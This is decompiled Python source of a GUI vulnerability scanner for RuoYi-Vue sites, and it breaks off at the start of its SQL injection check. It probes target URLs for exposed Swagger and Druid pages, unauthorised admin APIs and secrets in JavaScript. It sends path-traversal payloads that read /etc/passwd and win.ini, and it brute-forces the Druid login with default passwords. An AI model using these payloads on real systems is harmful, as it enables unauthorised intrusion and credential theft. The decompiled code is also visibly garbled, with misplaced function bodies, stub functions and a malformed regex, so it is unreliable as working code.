# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: ruoyi.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
import threading
import re
from datetime import datetime
from urllib.parse import urljoin
import os

class RuoYiScannerPro(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('若依Vue漏洞检测工具V7     https://github.com/kk12-30/ruoyi-Vue-tools    公众号:渗透测试之道')
        self.geometry('1300x800')
        self.timeout = 15
        self.proxies = None
        self.scanning = False
        self.discovered_apis = set()
        self.primary_color = '#1976D2'
        self.secondary_color = '#D32F2F'
        self.bg_color = '#F5F5F5'
        self.text_color = '#212121'
        icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logo.ico')
        if os.path.exists(icon_path):
            self.iconbitmap(icon_path)
        self._setup_ui()
        self._configure_style()
        self.result_area.tag_configure('path', foreground='navy')
        self.result_area.tag_configure('response_content', foreground='#D32F2F')

    def _configure_style(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('.', font=('微软雅黑', 10), background=self.bg_color)
        style.configure('TLabel', foreground=self.text_color)
        style.configure('TButton', padding=8, font=('微软雅黑', 10), background='#E0E0E0', foreground=self.text_color)
        style.configure('Critical.TButton', background=self.secondary_color, foreground='white')
        style.map('Critical.TButton', background=[('active', '#F44336'), ('pressed', '#B71C1C')])
        style.configure('Blue.TButton', background=self.primary_color, foreground='white')
        style.map('Blue.TButton', background=[('active', '#2196F3'), ('pressed', '#0D47A1')])
        style.configure('Main.TFrame', background=self.bg_color)
        style.configure('TLabelframe', background=self.bg_color)
        style.configure('TLabelframe.Label', font=('微软雅黑', 10, 'bold'), foreground=self.primary_color, background=self.bg_color)
        style.configure('TProgressbar', background=self.primary_color, troughcolor='#E0E0E0', borderwidth=0)

    def _setup_ui(self):
        self.configure(background=self.bg_color)
        main_frame = ttk.Frame(self, style='Main.TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        config_frame = ttk.LabelFrame(main_frame, text='扫描配置')
        config_frame.pack(fill=tk.X, pady=8)
        self._create_input_field(config_frame, '目标URL', 0)
        self._create_input_field(config_frame, 'Cookie', 1)
        self._create_input_field(config_frame, 'Authorization', 2)
        self._create_input_field(config_frame, 'HTTP代理', 3, default_proxy='')
        self._create_api_test_ui(config_frame)
        vuln_frame = ttk.LabelFrame(main_frame, text='漏洞模块')
        vuln_frame.pack(fill=tk.X, pady=8)
        buttons_row1 = [('Swagger检测', self.check_swagger), ('Druid检测', self.check_druid), ('文件读取', self.check_file_download), ('SQL注入', self.check_sql_injection), ('定时任务读取', self.check_scheduled_task), ('任意密码修改', self.check_password_reset), ('系统接口越权测试', self.check_system_apis)]
        buttons_row2 = [('获取JS接口', self.collect_js_apis), ('接口测试', self.start_api_test), ('敏感信息搜集', self.sensitive_info_collect), ('全面检测', self.full_scan), ('清空结果', self.clear_results), ('停止扫描', self.stop_scan)]
        button_frame1 = ttk.Frame(vuln_frame)
        button_frame1.pack(fill=tk.X, pady=5)
        for idx, (text, cmd) in enumerate(buttons_row1):
            btn = ttk.Button(button_frame1, text=text, command=cmd, style='Critical.TButton', width=15)
            btn.grid(row=0, column=idx, padx=5, pady=3)
        button_frame2 = ttk.Frame(vuln_frame)
        button_frame2.pack(fill=tk.X, pady=5)
        for idx, (text, cmd) in enumerate(buttons_row2):
            style = 'Blue.TButton' if text in ['获取JS接口', '接口测试', '敏感信息搜集'] else 'TButton'
            btn = ttk.Button(button_frame2, text=text, command=cmd, style=style, width=15)
            btn.grid(row=0, column=idx, padx=5, pady=3)
        progress_frame = ttk.Frame(main_frame)
        progress_frame.pack(fill=tk.X, pady=8)
        self.progress_label = ttk.Label(progress_frame, text='扫描进度:')
        self.progress_label.pack(side=tk.LEFT, padx=5)
        self.progress_bar = ttk.Progressbar(progress_frame, orient=tk.HORIZONTAL, length=300, mode='determinate')
        self.progress_bar.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        result_frame = ttk.LabelFrame(main_frame, text='扫描结果')
        result_frame.pack(fill=tk.BOTH, expand=True, pady=8)
        self.result_area = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD, font=('Consolas', 10), background='#FFFFFF', foreground=self.text_color, borderwidth=1, relief='solid')
        self.result_area.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.status_bar = ttk.Label(self, text='就绪', relief=tk.SUNKEN, anchor=tk.W, background='#E0E0E0', padding=(5, 2))
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def _create_api_test_ui(self, parent):
        frame = ttk.Frame(parent)
        frame.grid(row=4, column=0, columnspan=2, sticky=tk.W + tk.E, padx=5, pady=5)
        ttk.Label(frame, text='基础接口路径:', width=15).pack(side=tk.LEFT)
        self.entry_base_api = ttk.Entry(frame, width=30)
        self.entry_base_api.pack(side=tk.LEFT, padx=5)
        self.entry_base_api.insert(0, '/prod-api')
        ttk.Label(frame, text='请求方法:').pack(side=tk.LEFT, padx=(10, 0))
        self.request_method = tk.StringVar(value='GET')
        method_combo = ttk.Combobox(frame, textvariable=self.request_method, values=['GET', 'POST', 'POST-JSON'], width=10, state='readonly')
        method_combo.pack(side=tk.LEFT, padx=5)
        method_combo.bind('<<ComboboxSelected>>', self._toggle_request_body)
        self.body_frame = ttk.Frame(parent)
        ttk.Label(self.body_frame, text='请求体:', width=15).pack(side=tk.LEFT)
        self.entry_request_body = scrolledtext.ScrolledText(self.body_frame, height=3, width=80)
        self.entry_request_body.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self._toggle_request_body()

    def _toggle_request_body(self, event=None):
        """根据请求方法显示或隐藏请求体输入框"""  # inserted
        if self.request_method.get() in ['POST', 'POST-JSON']:
            self.body_frame.grid(row=5, column=0, columnspan=2, sticky=tk.W + tk.E, padx=5, pady=5)
        else:  # inserted
            self.body_frame.grid_forget()

    def _create_input_field(self, parent, label, row, default_proxy=None):
        clean_label = label.replace('：', '').strip()
        frame = ttk.Frame(parent)
        frame.grid(row=row, column=0, columnspan=2, sticky=tk.W + tk.E, padx=5, pady=5)
        ttk.Label(frame, text=label + ':', width=15).pack(side=tk.LEFT)
        entry = ttk.Entry(frame, width=80)
        entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        if default_proxy and '代理' in label:
            entry.insert(0, default_proxy)
        setattr(self, f'entry_{clean_label}', entry)

    def _get_config(self):
        return {'url': self.entry_目标URL.get().strip(), 'cookie': self.entry_Cookie.get().strip(), 'auth': self.entry_Authorization.get().strip(), 'proxy': self.entry_HTTP代理.get().strip()}

    def _get_base_api(self):
        base_api = self.entry_base_api.get().strip()
        if not base_api:
            base_api = '/prod-api'
            return base_api
        if not base_api.startswith('/'):
            base_api = '/' + base_api
        base_api = base_api.rstrip('/')
        return base_api

    def _build_headers(self, config):
        return {'Cookie': re.sub('[\\r\\n]', '', config['cookie']), 'Authorization': re.sub('[\\r\\n]', '', config['auth']), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}

    def _get_proxies(self, config):
        if config['proxy']:
            return {'http': config['proxy'], 'https': config['proxy']}

    def _log_result(self, message, severity='info', pure=False):
        if not pure:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            formatted_message = f'[{timestamp}] [{severity.upper()}] {message}\n'
        else:  # inserted
            formatted_message = f'{message}\n'
        color_map = {'info': '#212121', 'warning': '#FF8F00', 'critical': '#D32F2F', 'path': '#1565C0', 'response_content': '#D32F2F'}
        self.result_area.insert(tk.END, formatted_message, severity)
        self.result_area.tag_configure(severity, foreground=color_map.get(severity, '#212121'))
        self.result_area.see(tk.END)

    def collect_js_apis(self):
        if self.scanning:
            messagebox.showwarning('警告', '已有扫描任务正在进行，请稍后再试！')
        else:  # inserted
            self.scanning = True
            threading.Thread(target=self._collect_js_apis_thread).start()

    def _collect_js_apis_thread(self):
        config = self._get_config()
        base_url = config['url'].strip().rstrip('/')
        self._log_result('开始收集JS接口...', 'info')
        discovered_apis = set()
        self.js_files = []
        try:
            session = requests.Session()
            session.verify = False
            session.timeout = self.timeout
            headers = self._build_headers(config)
            proxies = self._get_proxies(config)
            response = session.get(base_url, headers=headers, proxies=proxies, timeout=self.timeout)
            if response.status_code!= 200:
                self._log_result(f'无法获取主页内容，状态码：{response.status_code}', 'warning')
                return
            script_pattern = re.compile('<script\\b[^>]*src\\s*=\\s*[\'\"]([^\'\"]+?\\.js(?:\\?[^\'\"]*)?)[\'\"][^>]*>', re.IGNORECASE)
            standard_js = script_pattern.findall(response.text)
            chunk_map = re.findall('\"\\b(chunk-[a-fA-F0-9]{8,32})\\b\"\\s*:\\s*\"([a-fA-F0-9]{8})\"', response.text)
            js_urls = []
            for path in standard_js:
                full_url = urljoin(base_url, path)
                js_urls.append(full_url)
            for chunk_name, chunk_hash in chunk_map:
                dynamic_path = f'/static/js/{chunk_name}.{chunk_hash}.js'
                full_url = urljoin(base_url, dynamic_path)
                js_urls.append(full_url)
            js_urls = list(set(js_urls))
            self._log_result(f'发现 {len(js_urls)} 个JS文件（含{len(chunk_map)}个动态chunk）', 'info')

            def clean_path(path):
                pass  # postinserted
                from concurrent.futures import ThreadPoolExecutor, as_completed
                max_workers = 10
                self.progress_bar['maximum'] = len(js_urls)
                path = re.sub('\\${[^}]+}', '', path)
                path = re.sub('[\"\\\'`].*', '', path)
                path = re.sub('[,\\\\)\\]}].*', '', path)
                path = path.split('?')[0].split('#')[0]
                path = re.sub('//+', '/', path).strip('/')
                exclude_prefixes = ('static/', 'assets/', 'css/', 'js/', 'img/')
                if any((path.startswith(p) for p in exclude_prefixes)):
                    return
                if any((key in path for key in ['api', 'prod-api', 'dev-api', 'monitor', 'system'])) or re.match('^[\\w-]+/[\\w-]+(/[\\w-]+)*$', path):
                    return path
                return None

            def process_js_file(url):
                pass  # postinserted
            
            completed = 0
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_url = {executor.submit(process_js_file, url): url for url in js_urls}
                if not self.scanning:
                    return
                try:
                    resp = session.get(url, headers=headers, proxies=proxies, timeout=self.timeout)
                    if resp.status_code!= 200:
                        return
                    content_type = resp.headers.get('Content-Type', '').lower()
                    if 'javascript' not in content_type:
                        if not url.endswith('.js'):
                            return
                    js_file = {'url': url, 'content': resp.text}
                    found_apis = set()
                    api_patterns = [re.compile('[\"\'`]\\s*((?:/[\\w\\-/]+)+)\\s*[\"\'`]', re.I), re.compile('\\.(?:get|post|put|patch|delete)$[\"\'`]\\s*([^\"\'`?\\#]+)', re.I), re.compile('path\\s*:\\s*[\"\'`]([^\"\'`?\\#]+)', re.I), re.compile('import\\([\"\'`]([^\"\'`?\\#]+)[\"\'`]$', re.I)]
                    for pattern in api_patterns:
                        for match in pattern.findall(resp.text):
                            if isinstance(match, tuple):
                                match = match[0]
                            cleaned = clean_path(str(match))
                            if cleaned:
                                found_apis.add(cleaned)
                    source_map_match = re.search('//#\\s*sourceMappingURL=(.*\\.map)', resp.text)
                    if source_map_match:
                        pass
                    return {'js_file': js_file, 'apis': found_apis}
                except Exception as e:
                    self._log_result(f'处理 {url} 时异常: {str(e)}', 'warning')
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    completed += 1
                    self.progress_bar['value'] = completed
                    self.status_bar.config(text=f'进度: {completed}/{len(js_urls)} ({int(completed / len(js_urls) * 100)}%)')
                    self.update_idletasks()
                    result = future.result()
                    if result:
                        self.js_files.append(result['js_file'])
                        discovered_apis.update(result['apis'])
            system_routes = {}
            discovered_apis.update(system_routes)
            self.discovered_apis = discovered_apis
            if self.discovered_apis:
                self._log_result('[+] 发现以下接口路径:', 'critical', pure=True)
                for api in sorted(self.discovered_apis):
                    self._log_result(f'{api}', 'path', pure=True)
            else:  # inserted
                self._log_result('未发现有效接口路径', 'info')
        except Exception as e:
            self._log_result(f'接口收集异常: {str(e)}', 'critical')
        finally:  # inserted
            self.scanning = False
            self.progress_bar['value'] = 100
            self.status_bar.config(text='JS接口收集完成')
            self.scanning = False
            self.progress_bar['value'] = 100
            self.status_bar.config(text='JS接口收集完成')

    def start_api_test(self):
        if self.scanning:
            messagebox.showwarning('警告', '已有扫描任务正在进行！')
            return
        if not self.discovered_apis:
            messagebox.showwarning('警告', '请先执行接口收集！')
            return
        self.scanning = True
        threading.Thread(target=self._perform_api_test).start()

    def _perform_api_test(self):
        config = self._get_config()
        base_api = self._get_base_api()
        self._log_result('\n[+] 开始接口测试...', 'critical', pure=True)
        headers = self._build_headers(config)
        total = len(self.discovered_apis)
        self.progress_bar['maximum'] = total
        request_method = self.request_method.get()
        request_body = self.entry_request_body.get('1.0', tk.END).strip()
        json_body = {}
        if request_method == 'POST-JSON':
            headers['Content-Type'] = 'application/json'
            if request_body:
                try:
                    import json
                    json_body = json.loads(request_body)
                except json.JSONDecodeError:
                    self._log_result('请求体JSON格式错误，将使用空对象', 'warning')
                    json_body = {}
        session = requests.Session()
        session.verify = False
        proxies = self._get_proxies(config)
        self.result_area.tag_configure('preview', foreground='#FF8F00')
        from concurrent.futures import ThreadPoolExecutor, as_completed
        max_workers = 10

        def process_api(api_path):
            if not self.scanning:
                return
            full_url = urljoin(config['url'].rstrip('/'), f"{base_api}/{api_path.lstrip('/')}")
            try:
                if request_method == 'GET':
                    resp = session.get(full_url, headers=headers, proxies=proxies, timeout=self.timeout)
                else:  # inserted
                    if request_method == 'POST':
                        resp = session.post(full_url, data=request_body, headers=headers, proxies=proxies, timeout=self.timeout)
                    else:  # inserted
                        if request_method == 'POST-JSON':
                            resp = session.post(full_url, json=json_body, headers=headers, proxies=proxies, timeout=self.timeout)
                        else:  # inserted
                            return None
                status_code = resp.status_code
                content_type = resp.headers.get('Content-Type', '')
                preview = resp.text[:15].replace('\n', ' ').replace('\r', '')
                if 200 <= status_code < 300:
                    try:
                        if 'json' in content_type.lower():
                            response_data = resp.json()
                            if self._contains_sensitive_info(response_data):
                                return {'api_path': api_path, 'url': full_url, 'status_code': status_code, 'content_type': content_type, 'response': resp.text, 'preview': preview, 'sensitive': True}
                    except:
                        pass
                    if len(resp.text) > 50:
                        return {'api_path': api_path, 'url': full_url, 'status_code': status_code, 'content_type': content_type, 'response': resp.text, 'preview': preview, 'sensitive': False}
            except Exception as e:
                return None
        completed = 0
        valid_responses = []
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_api = {executor.submit(process_api, api_path): api_path for api_path in sorted(self.discovered_apis)}
                for future in as_completed(future_to_api):
                    api_path = future_to_api[future]
                    completed += 1
                    self.progress_bar['value'] = completed
                    self.status_bar.config(text=f'进度: {completed}/{total} ({int(completed / total * 100)}%)')
                    self.update_idletasks()
                    result = future.result()
                    if result:
                        valid_responses.append(result)
                        self._log_result(f"[+] 发现有效接口: {result['url']} [状态码: {result['status_code']}]", 'critical' if result.get('sensitive', False) else 'path', pure=True)
                        if 'preview' in result and result['preview']:
                            self._log_result(f"[预览: {result['preview']}]", 'preview', pure=True)
                        if result.get('sensitive', False):
                            self._log_result(f"响应内容: {result['response'][:200]}...", 'response_content', pure=True)
            if valid_responses:
                self._log_result(f'\n[+] 接口测试完成，共发现 {len(valid_responses)} 个有效接口', 'critical', pure=True)
            else:  # inserted
                self._log_result('接口测试完成，未发现有效接口', 'info')
        except Exception as e:
            self._log_result(f'接口测试异常: {str(e)}', 'critical')
        finally:  # inserted
            self.status_bar.config(text='接口测试完成')

    def check_system_apis(self):
        """测试系统常见接口"""  # inserted
        if self.scanning:
            messagebox.showwarning('警告', '已有扫描任务正在进行，请稍后再试！')
        else:  # inserted
            self.scanning = True
            threading.Thread(target=self._check_system_apis_thread).start()

    def _check_system_apis_thread(self):
        """系统接口测试线程"""  # inserted
        config = self._get_config()
        base_url = config['url'].strip().rstrip('/')
        base_api = self._get_base_api()
        system_apis = ['/system/user/authRole/1', '/system/user/1', '/system/user/2', '/system/config/list?pageNum=1&pageSize=10', '/system/user/authRole?userId=2&roleIds=2', '/system/role/list?pageNum=1&pageSize=10', '/system/post/list?pageNum=1&pageSize=10', '/system/dept/100', '/system/user/list?pageNum=1&pageSize=10', '/system/user/export']
        self._log_result('\n[+] 开始系统接口测试...', 'critical', pure=True)
        headers = self._build_headers(config)
        proxies = self._get_proxies(config)
        total = len(system_apis)
        self.progress_bar['maximum'] = total
        self.progress_bar['value'] = 0
        session = requests.Session()
        session.verify = False
        session.timeout = self.timeout
        for index, api_path in enumerate(system_apis):
            if not self.scanning:
                break
            full_url = f'{base_url}{base_api}{api_path}'
            self.status_bar.config(text=f'正在测试: {api_path}')
            self.progress_bar['value'] = index + 1
            self.update_idletasks()
            try:
                response = session.get(full_url, headers=headers, proxies=proxies, timeout=self.timeout)
                if response.status_code == 200:
                    try:
                        json_data = response.json()
                        if 'code' in json_data and json_data['code'] == 200:
                            self._log_result(f'[+] 接口存在: {api_path}', 'critical', pure=True)
                            preview = str(json_data)[:200] + '...' if len(str(json_data)) > 200 else str(json_data)
                            self._log_result(f'响应内容: {preview}', 'response_content', pure=True)
                        else:  # inserted
                            self._log_result(f'[-] 接口响应异常: {api_path}', 'warning', pure=True)
                    except ValueError:
                        if 'success' in response.text.lower() or '成功' in response.text:
                            self._log_result(f'[+] 接口存在: {api_path}', 'critical', pure=True)
                        else:  # inserted
                            self._log_result(f'[-] 接口响应非JSON: {api_path}', 'warning', pure=True)
                self._log_result(f'[-] 接口不存在或无权限: {api_path} (状态码: {response.status_code})', 'warning', pure=True)
            except requests.exceptions.RequestException as e:
                self._log_result(f'[-] 请求异常: {api_path} - {str(e)}', 'warning', pure=True)
        self.scanning = False
        self.status_bar.config(text='系统接口测试完成')
        self._log_result('\n[+] 系统接口测试完成', 'info', pure=True)

    def _contains_sensitive_info(self, data):
        """检查响应中是否包含敏感信息"""  # inserted
        if isinstance(data, dict):
            sensitive_keys = ['password', 'token', 'secret', 'key', 'credential', 'auth', 'pwd']
            for key in data.keys():
                if any((s in key.lower() for s in sensitive_keys)):
                    return True
                if isinstance(data[key], dict) and self._contains_sensitive_info(data[key]):
                    return True
                if isinstance(data[key], list):
                    for item in data[key]:
                        if isinstance(item, dict) and self._contains_sensitive_info(item):
                            return True
        return False

    def _get_content_preview(self, response):
        """提取响应内容的摘要信息"""  # inserted
        try:
            content_type = response.headers.get('Content-Type', '').lower()
            if 'application/json' in content_type:
                data = response.json()
                if isinstance(data, dict):
                    if 'code' in data and 'msg' in data:
                        msg = data.get('msg', '')
                        code = data.get('code', '')
                        return f'[code:{code}] {msg}'
                    preview_fields = []
                    for key in ['message', 'status', 'error', 'success', 'data', 'result']:
                        if key in data:
                            value = data[key]
                            if isinstance(value, (dict, list)):
                                value = f'{type(value).__name__}[{len(value)}]'
                            preview_fields.append(f'{key}:{value}')
                    if preview_fields:
                        return ' | '.join(preview_fields[:3])
                    preview = ', '.join([f'{k}:{v}' for k, v in list(data.items())[:2]])
                    return f'{preview}...' if len(data) > 2 else preview
                else:  # inserted
                    if isinstance(data, list):
                        return f'Array[{len(data)}]' + (f': {str(data[0])[:30]}...' if data else '')
                    if len(str(data)) > 50:
                        return str(data)[:50] + '...'
                    return str(data)
            else:  # inserted
                if 'text/html' in content_type:
                    text = response.text.strip()
                    if len(text) > 100:
                        return text[:100].replace('\n', ' ') + '...'
                    return text
                text = response.text.strip()
                if text and len(text) <= 100:
                    return text
                if text:
                    return text[:100].replace('\n', ' ') + '...'
                return f'二进制内容 ({self._format_size(len(response.content))})'
        except Exception as e:
            return f'内容解析失败: {str(e)[:30]}'

    def _extract_title(self, html):
        match = re.search('<title>(.*?)</title>', html, re.IGNORECASE)
        if match:
            title = match.group(1).strip()
            try:
                if isinstance(title, bytes):
                    title = title.decode('utf-8')
                title = title.encode('utf-8', errors='ignore').decode('utf-8')
                return title
            except Exception:
                title = '标题解码失败'
                return title
        return '无标题'

    def _format_size(self, size):
        if size < 1024:
            return f'{size}B'
        if size < 1048576:
            return f'{size / 1024:.1f}KB'
        return f'{size / 1048576:.1f}MB'

    def _analyze_source_map(self, base_url, map_path, headers):
        try:
            map_url = urljoin(base_url, map_path)
            resp = requests.get(map_url, headers=headers, proxies=self._get_proxies(self._get_config()), verify=False, timeout=self.timeout)
            if resp.status_code == 200:
                self._log_result(f'发现Source Map文件: {map_url}', 'info')
                api_matches = re.findall('\"([^\"]*api[^\"]+)\"', resp.text)
                for api in set(api_matches):
                    cleaned_api = re.sub('^\\./|/index$', '', api)
                    self._log_result(f'  ↳ [SourceMap] {cleaned_api}', 'info')
        except Exception as e:
            self._log_result(f'Source Map分析失败: {str(e)}', 'warning')

    def sensitive_info_collect(self):
        if self.scanning:
            messagebox.showwarning('警告', '已有扫描任务正在进行，请稍后再试！')
            return
        if not hasattr(self, 'js_files') or not self.js_files:
            messagebox.showwarning('警告', '请先执行JS接口获取！')
            return
        self.scanning = True
        threading.Thread(target=self._sensitive_info_collect_thread).start()

    def _sensitive_info_collect_thread(self):
        self._log_result('\n[+] 开始敏感信息搜集...', 'critical', pure=True)
        total = len(self.js_files)
        self.progress_bar['maximum'] = total
        self.progress_bar['value'] = 0
        sensitive_patterns = [
            {
                'name': '密码明文',
                'pattern': '(?xi)\n                \\b(?:password|passwd|pwd|credential)\\b\\s*[=:]\\s*  # 关键字段\n                (?:\'([^\'\\n{};]*)\'|"([^"\\n{};]*)"|`([^`\\n{};]*)`)  # 限定在引号内\n                (?!\\s*[{;])  # 排除代码块结尾\n            ',
                'severity': 'critical' },
            {
                'name': '用户名',
                'pattern': 'username\\s*:\\s*"([^"]+)"',
                'severity': 'high' },
            {
                'name': 'API密钥',
                'pattern': '(?i)\\b(?:api_?key|secret_?key)\\b\\s*[=:]\\s*[\\\'"]?([0-9a-zA-Z\\-_]{20,50})[\\\'"]?',
                'severity': 'critical' },
            {
                'name': 'JWT令牌',
                'pattern': '\\b(eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+)\\b',
                'severity': 'critical' },
            {
                'name': 'OAuth令牌',
                'pattern': '\\b(ya29\\.[0-9A-Za-z\\-_~]+)\\b',
                'severity': 'critical' },
            {
                'name': '数据库连接字符串',
                'pattern': '\\b(mysql://|postgresql://|mongodb://)([a-zA-Z0-9_%]+:[^@]+@[^\\s\\\'"]+)',
                'severity': 'critical' },
            {
                'name': 'Redis URL',
                'pattern': '\\b(redis://:[^@]+@[^\\s\\\'"]+:[0-9]+)\\b',
                'severity': 'critical' },
            {
                'name': '云存储URL',
                'pattern': '\\bhttps?://([a-z0-9.-]+\\.(s3|r2|blob\\.core\\.windows\\.net|storage\\.googleapis\\.com)/[^\\s\\\'"]+)\\b',
                'severity': 'critical' },
            {
                'name': 'GitHub令牌',
                'pattern': '\\b(ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})\\b',
                'severity': 'critical' },
            {
                'name': '内部IP地址',
                'pattern': '\\b(10\\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\\.\\d{1,3}\\.\\d{1,3}|172\\.(1[6-9]|2\\d|3[0-1])\\.\\d{1,3}\\.\\d{1,3}|192\\.168\\.\\d{1,3}\\.\\d{1,3})\\b',
                'severity': 'critical' },
            {
                'name': '邮箱地址',
                'pattern': '\\b([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,20)\\b',
                'severity': 'medium' },
            {
                'name': '手机号码',
                'pattern': '\\b(?:1[3-9]\\d{9}|(\\+86)?1[3-9]\\d{9})\\b',
                'severity': 'medium' }]
        for index, js_file in enumerate(self.js_files):
            if not self.scanning:
                break
            self._update_progress(index, total)
            url = js_file['url']
            content = js_file['content']
            found = False
            for pattern in sensitive_patterns:
                try:
                    matches = re.finditer(pattern['pattern'], content, re.IGNORECASE)
                    for match in matches:
                        found = True
                        if match.lastindex:
                            value = next((g for g in match.groups() if g is not None), match.group(0))
                        else:  # inserted
                            value = match.group(0)
                        if len(value) > 4:
                            masked = value[:2] + '*' * (len(value) - 4) + value[(-2):]
                        else:  # inserted
                            masked = value
                        log_msg = f"[!] {pattern['name']} 发现于 {url}:\n    {masked} (原始值: {value})"
                        self._log_result(log_msg, 'critical')
                except Exception as e:
                    self._log_result(f"正则匹配异常 [{pattern['name']}]: {str(e)}", 'warning')
            if not found:
                self._log_result(f'[√] {url} 未发现敏感信息', 'info')
        self.scanning = False
        self.progress_bar['value'] = 100
        self.status_bar.config(text='敏感信息搜集完成')

    def check_swagger(self):
        config = self._get_config()
        base_api = self._get_base_api()
        paths = ['/swagger-ui/index.html', f'{base_api}/v2/api-docs', f'{base_api}/v3/api-docs', '/api/v3/api-docs', '/api/v2/api-docs']
        for path in paths:
            self._detect_swagger(config, path)

    def _detect_swagger(self, config, path):
        """检测Swagger接口"""  # inserted
        url = config['url'].strip().rstrip('/') + path
        headers = self._build_headers(config)
        proxies = self._get_proxies(config)
        try:
            response = requests.get(url, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
            if response.status_code == 200:
                swagger_features = ['swaggerVersion', 'openapi', 'Swagger UI', 'api-docs', 'SwaggerUIBundle', 'swagger-ui', 'swagger-resources', 'version']
                if any((feature.lower() in response.text.lower() for feature in swagger_features)):
                    self._log_result(f'[+] 发现Swagger接口: {url}', 'critical')
                    return True
                self._log_result(f'[-] 接口返回200但未包含Swagger特征: {url}', 'info')
                return False
            self._log_result(f'[-] Swagger接口不存在: {url}', 'info')
            return False
        except Exception as e:
            self._log_result(f'[-] 检测Swagger接口异常: {url}, {str(e)}', 'warning')
            return False

    def check_druid(self):
        if self.scanning:
            messagebox.showwarning('警告', '已有扫描任务正在进行，请稍后再试！')
        else:  # inserted
            self.scanning = True
            threading.Thread(target=self._druid_scan_thread).start()

    def _druid_scan_thread(self):
        config = self._get_config()
        base_api = self._get_base_api()
        paths = [f'{base_api}/druid/login.html', f'{base_api}/druid/index.html', f'{base_api}/druid/basic.json']
        self._log_result('开始Druid综合检测...', 'info')
        total = len(paths)
        for idx, path in enumerate(paths):
            if not self.scanning:
                break
            self._update_progress(idx, total)
            if path.endswith('basic.json'):
                self._detect_unauth_access(config, path)
            else:  # inserted
                self._detect_endpoint(config, path, keyword='druid monitor')
                if 'login.html' in path:
                    self._bruteforce_druid(config, path)
        self.scanning = False
        self.status_bar.config(text='Druid检测完成')

    def _detect_unauth_access(self, config, path):
        url = config['url'].rstrip('/') + path
        try:
            headers = self._build_headers(config)
            resp = requests.get(url, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                try:
                    response_json = resp.json()
                    if isinstance(response_json, dict) and 'JavaClassPath' in response_json:
                        self._log_result(f'[严重] Druid未授权访问漏洞: {path} (JavaClassPath泄露)', 'critical')
                        return
                except ValueError:
                    pass
                if 'JavaClassPath' in resp.text:
                    self._log_result(f'[严重] Druid未授权访问漏洞: {path} (明文信息泄露)', 'critical')
                else:  # inserted
                    self._log_result(f'{path} 不存在Druid未授权访问', 'info')
            else:  # inserted
                if resp.status_code == 401:
                    self._log_result(f'{path} 需要身份验证', 'info')
                else:  # inserted
                    self._log_result(f'{path} 访问失败，状态码: {resp.status_code}', 'info')
        except requests.exceptions.RequestException as e:
            self._log_result(f'{path} 请求失败: {str(e)}', 'warning')
        except Exception as e:
            self._log_result(f'{path} 检测异常: {str(e)}', 'warning')

    def _bruteforce_druid(self, config, path):
        submit_path = path.replace('login.html', 'submitLogin')
        target_url = config['url'].rstrip('/') + submit_path
        credentials = [('admin', '123456'), ('ruoyi', '123456'), ('druid', 'druid'), ('admin', 'admin123'), ('admin', 'admin888'), ('ruoyi', 'ruoyi')]
        try:
            headers = {**self._build_headers(config), 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': config['url'].rstrip('/'), 'Referer': config['url'].rstrip('/') + path}
            for username, password in credentials:
                try:
                    data = {'loginUsername': username, 'loginPassword': password}
                    resp = requests.post(target_url, data=data, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
                    if resp.status_code == 200:
                        response_text = resp.text.strip().lower()
                        if response_text == 'success':
                            self._log_result(f'[严重] Druid弱口令爆破成功: {username}:{password} @ {submit_path}', 'critical')
                            return
                        if response_text == 'error':
                            continue
                        self._log_result(f'异常响应内容: {resp.text[:50]}...', 'warning')
                except requests.exceptions.RequestException as e:
                    self._log_result(f'请求失败: {str(e)}', 'warning')
                except Exception as e:
                    self._log_result(f'未知错误: {str(e)}', 'warning')
        except Exception as e:
            self._log_result(f'爆破初始化失败: {str(e)}', 'critical')
        finally:  # inserted
            self._log_result(f'{submit_path} 未发现有效凭证', 'info')
            self._log_result(f'{submit_path} 未发现有效凭证', 'info')

    def check_file_download(self):
        config = self._get_config()
        base_api = self._get_base_api()
        payloads = [('/common/download/resource?resource=/profile/../../../../../../../etc/passwd', 'root:'), ('/common/download/resource?name=/profile/../../../../../../../etc/passwd', 'root:'), ('/common/download/resource?name=../../../../../../../windows/win.ini&delete=false', '[extensions]'), ('/common/download/resource?resource=../../../../../../../windows/win.ini&delete=false', '[extensions]'), ('/common/download?fileName=../../../../../../../windows/win.ini&delete=false', '[extensions]'), ('/common/download?fileName=../../../../../../../etc/passwd&delete=false', 'root:')]
        for path, keyword in payloads:
            self._detect_endpoint(config, path, keyword=keyword)

    def check_sql_injection(self):
        config = self._get_config()
        base_api = self._get_base_api()
